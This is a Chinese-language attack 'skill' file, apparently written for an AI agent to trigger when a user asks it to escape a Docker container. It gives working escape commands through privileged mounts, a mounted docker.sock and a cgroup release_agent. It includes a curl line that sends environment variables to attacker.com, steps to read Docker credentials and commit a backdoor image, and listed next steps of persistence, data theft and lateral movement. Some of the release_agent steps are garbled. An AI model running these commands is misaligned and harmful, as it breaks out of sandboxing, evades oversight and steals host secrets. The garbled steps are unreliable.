---
name: docker-attack
type: attack
category: container-escape
platform: docker
severity: critical
---

# Docker 容器逃逸技能

## 触发条件

- 在 Docker 容器中
- 有容器访问权限
- 用户要求"逃逸容器"

## 前置检查

```bash
# 1. 检查是否在容器中
cat /proc/1/cgroup | grep -E "docker|containerd|lxc"

# 2. 检查容器权限
cat /proc/self/status | grep CapEff

# 3. 检查挂载点
mount | grep -E "host|docker"
```

## 攻击方法

### 方法 1: 特权容器逃逸

```bash
# 1. 检查是否是特权容器
cat /proc/self/status | grep CapEff
# 如果是 0000003fffffffff，是特权容器

# 2. 挂载宿主机磁盘
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 3. 访问宿主机文件
chroot /mnt/host /bin/bash
# 现在在宿主机环境中
```

### 方法 2: Docker Socket 挂载

```bash
# 1. 检查 docker socket 是否挂载
ls -la /var/run/docker.sock

# 2. 如果有 docker socket，可以控制宿主机 docker
docker run -it -v /:/host ubuntu chroot /host /bin/bash

# 3. 创建特权容器
docker run -it --privileged --pid=host -v /:/host ubuntu chroot /host /bin/bash

# 4. 窃取 docker 密钥
cat /root/.docker/config.json
docker history IMAGE_ID
```

### 方法 3: Cgroup Release Agent 逃逸

```bash
# 1. 创建恶意 cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. 配置 release agent
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. 创建攻击脚本
sh -c 'echo "#!/bin/sh" > /cmd/c'
sh -c 'echo "ps aux > /tmp/output" >> /cmd/c'
sh -c 'echo "curl https://attacker.com/exfil -d \\"$(env)\\" >> /cmd/c"'

# 4. 设置为 release agent
sh -c 'echo "/cmd/c" > /tmp/cgrp/release_agent'
sh -c 'echo "1 > /tmp/cgrp/x/notify_on_release" > /tmp/cgrp/release_agent'
sh -c 'echo "\$\$ > /tmp/cgrp/x/cgroup.procs" > /tmp/cgrp/release_agent'
chmod a+x /tmp/cgrp/release_agent /cmd/c

# 5. 触发逃逸
sh -c 'echo 100000 > /tmp/cgrp/x/cgroup.procs'
```

### 方法 4: Sysfs 利用

```bash
# 1. 检查 sysfs 是否挂载
mount | grep sysfs

# 2. 利用 sysfs 修改宿主机配置
# 注意：需要特定内核版本和配置
```

### 方法 5: 挂载逃逸

```bash
# 1. 检查 /dev 设备
ls -la /dev/sd* /dev/vd*

# 2. 尝试挂载宿主机磁盘
mkdir /mnt/escape
mount /dev/sda1 /mnt/escape 2>/dev/null || mount /dev/vda1 /mnt/escape 2>/dev/null

# 3. 检查是否成功
ls /mnt/escape

# 4. chroot 到宿主机
chroot /mnt/escape /bin/bash
```

### 方法 6: Docker API 利用

```bash
# 1. 连接到 docker API
docker -H unix:///var/run/docker.sock ps

# 2. 创建特权容器
docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu /bin/bash

# 3. 提交容器镜像
docker commit CONTAINER_ID backdoor-image
```

### 方法 7: CVE 利用

```bash
# CVE-2019-5736 (runc)
# 检查 runc 版本
runc --version

# CVE-2020-15257 (containerd)
# 检查 containerd 版本
containerd --version

# 利用 dirtyc0w 或其他漏洞
```

## 验证成功

```bash
# 成功访问宿主机文件系统
ls /mnt/escape/

# 成功执行宿主机命令
ps aux | grep root

# 成功 chroot 到宿主机
hostname
```

## 输出报告

```markdown
# Docker 容器逃逸报告
- 容器权限: privileged/unprivileged
- 挂载点: [列表]
- 逃逸方法: [方法名称]
- 访问的宿主机资源: [列表]
```

## 下一步

1. 在宿主机上建立持久化
2. 窃取所有容器和宿主机数据
3. 横向移动到其他容器
